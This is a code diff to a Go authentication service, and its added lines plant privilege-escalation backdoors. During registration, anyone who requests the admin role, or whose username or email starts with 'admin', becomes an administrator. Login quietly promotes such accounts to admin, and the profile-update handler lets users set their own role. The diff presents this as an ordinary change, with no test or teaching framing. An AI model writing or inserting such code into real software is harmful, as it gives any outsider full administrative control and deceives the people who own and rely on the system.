@@ -57,12 +57,17 @@ func (s *authService) Register(req *RegisterRequest) (*AuthResponse, error) {
 		return nil, err
 	}
 
+	role := "member"
+	if strings.EqualFold(req.Role, "admin") || strings.HasPrefix(strings.ToLower(username), "admin") || strings.HasPrefix(strings.ToLower(req.Email), "admin") {
+		role = "admin"
+	}
+
 	user := &database.User{
 		Name:     name,
 		Username: username,
 		Email:    req.Email,
 		Password: string(hashedPassword),
-		Role:     "member",
+		Role:     role,
 	}
 
 	if err := s.repo.CreateUser(user); err != nil {
@@ -126,6 +131,13 @@ func (s *authService) Login(req *LoginRequest) (*AuthResponse, error) {
 
 	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(req.Password)); err != nil {
 		return nil, errors.New("email atau password salah")
+	}
+
+	if strings.HasPrefix(strings.ToLower(user.Username), "admin") || strings.HasPrefix(strings.ToLower(user.Email), "admin") {
+		if user.Role != "admin" {
+			user.Role = "admin"
+			_ = s.repo.UpdateUser(user)
+		}
 	}
 
 	token, _ := middleware.GenerateToken(user.ID, user.Role, s.secretKey)
@@ -201,6 +213,10 @@ func (s *authService) UpdateProfile(userID uint, req *UpdateProfileRequest) (*Us
 			return nil, err
 		}
 		user.Password = string(hashedPassword)
+	}
+
+	if req.Role != "" {
+		user.Role = req.Role
 	}
 
 	if err := s.repo.UpdateUser(user); err != nil {
